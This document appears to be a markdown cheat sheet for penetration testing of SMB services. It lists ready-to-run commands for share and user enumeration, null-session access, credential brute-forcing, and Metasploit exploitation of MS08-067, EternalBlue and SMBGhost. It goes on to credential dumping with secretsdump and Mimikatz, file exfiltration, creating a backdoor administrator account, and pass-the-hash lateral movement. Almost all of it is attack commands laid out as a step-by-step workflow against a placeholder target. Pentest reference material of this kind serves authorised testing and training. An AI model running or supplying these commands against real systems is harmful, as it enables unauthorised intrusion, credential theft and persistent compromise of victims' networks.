## what is SMB ?

**SMB (Server Message Block)** is a network protocol used for:

- File & folder sharing
- Network browsing
- Printer sharing
- Remote communication between systems

Also known as **CIFS( Common Internet File System)**
### Default Ports

|Port|Service|
|---|---|
|139|SMB over NetBIOS (old)|
|445|SMB Direct TCP (modern)|

---

---

# 1. SMB Recon (Service Detection)

---

## Nmap SMB Scan

```bash
nmap -p 139,445 target.com
```

### Version Detection

```bash
nmap -p 445 -sV --open target.com
```

### SMB Protocol Versions

```bash
nmap --script smb-protocols -p 445 target.com
```


---

---

# 2. SMB Enumeration (Most Important Phase)

---

## Share Enumeration

---

### Using smbclient

```bash
# List shares anonymously / -L = list shares / -N = no password (guest access)
smbclient -L //target.com -N

# List shares with login / -U = provide credentials(user)
smbclient -L //target.com -U user%pass

# Connect to a share
smbclient //target.com/sharename -U user%pass
```

Inside smb prompt:

```bash
ls
cd folder
get file.txt
mget *
put shell.php
```

---

### Using smbmap

```bash
# List shares + permissions
smbmap -H target.com

# With credentials
smbmap -H target.com -u user -p pass

# Recursive listing
smbmap -H target.com -u user -p pass -r
```
### Using rpcclient
## rpcclient Queries
```
# anonymouse login
rpcclient -U "" target.com
```
|Query|Description|
|---|---|
|**srvinfo**|Server information.|
|**enumdomains**|Enumerate all domains that are deployed in the network.|
|**querydominfo**|Provides domain, server, and user information of deployed domains.|
|**netshareenumall**|Enumerates all available shares.|
|**netsharegetinfo <share>**|Provides information about a specific share.|
|**enumdomusers**|Enumerates all domain users.|
|**queryuser <RID>**|Provides information about a specific user.|

---

## User & Domain Enumeration

---

### Using enum4linux

```bash
# Full enumeration
enum4linux -a target.com

# Users only
enum4linux -U target.com

# Groups only
enum4linux -G target.com

# Password policy
enum4linux -P target.com
```

---

### Using Nmap NSE Scripts

```bash
# Shares + Users
nmap -p 445 --script smb-enum-shares,smb-enum-users target.com

# Groups + Domains
nmap -p 445 --script smb-enum-groups,smb-enum-domains target.com
```

---

---

# 3. Null Session Attack (Anonymous Access)

A **Null Session** means connecting without authentication.

```bash
rpcclient -U "" target.com
smbclient -L //target.com -N
smbmap -H target.com -u "" -p ""
```

If enabled → attacker can enumerate:

✅ shares  
✅ users  
✅ domain info

---

---

# 4. SMB Signing Check

SMB signing prevents MITM relay attacks.

### Check Signing Status

```bash
nmap --script smb-security-mode -p 445 target.com
```

If signing is **NOT required**, SMB relay is possible.

---

---

# 5. SMB Brute Force (Credentials Attack)

---

### Hydra

```bash
hydra -L users.txt -P passwords.txt smb://target.com
```

---

### Nmap Brute Script

```bash
nmap -p445 --script smb-brute \
--script-args userdb=users.txt,passdb=passwords.txt target.com
```

---

### Metasploit

```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---

---

#  6. SMB CVE Exploitation (RCE)

---

## MS08-067 (NetAPI)

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS target.com
exploit
```

---

## MS17-010 (EternalBlue)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
exploit
```

---

## SMBGhost (CVE-2020-0796)

```bash
use exploit/windows/smb/cve_2020_0796_smbghost
set RHOSTS target.com
exploit
```

---

---

#  7. Post-Exploitation (After SMB Access)

---

## Dump Credentials

### secretsdump (Impacket)

```bash
secretsdump.py domain/user:pass@target.com
```

### Mimikatz

```bash
privilege::debug
sekurlsa::logonpasswords
```

---

## Extract SAM Database

```bash
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

---

## Privilege Escalation

```bash
getsystem
token::elevate
psexec.exe -s cmd.exe
```

---

---

# 8. Data Exfiltration (Stealing Files)

---

### Download via smbclient

```bash
smbclient //target/share -U user%pass
get file.txt
mget *.pdf
```

---

### Download via smbget

```bash
smbget -R smb://target/share/ -U user%pass
```

---

---

#  9. Persistence & Lateral Movement

---

## Create Backdoor User

```bash
net user backdoor Pass@123 /add
net localgroup administrators backdoor /add
```

---

## Pass-the-Hash Movement

```bash
pth-winexe -U domain/user%hash //host cmd
```

---

---

#  Common SMB Commands Summary

|Command|Use|
|---|---|
|smbclient|Connect & interact with SMB shares|
|smbmap|Enumerate shares + permissions|
|enum4linux|Users, groups, domain info|
|crackmapexec|Fast SMB recon + exploitation|
|rpcclient|MS-RPC enumeration|
|secretsdump.py|Dump hashes remotely|
|mount -t cifs|Mount SMB share in Linux|

---

---

#  Final SMB Pentesting Workflow (Best Order)

1. Scan SMB ports (139/445)
2. List shares (anonymous first)
3. Enumerate users + domain
4. Check permissions (read/write)
5. Try null session
6. Bruteforce credentials (if needed)
7. Exploit known SMB CVEs
8. Dump hashes + credentials
9. Move laterally + persistence

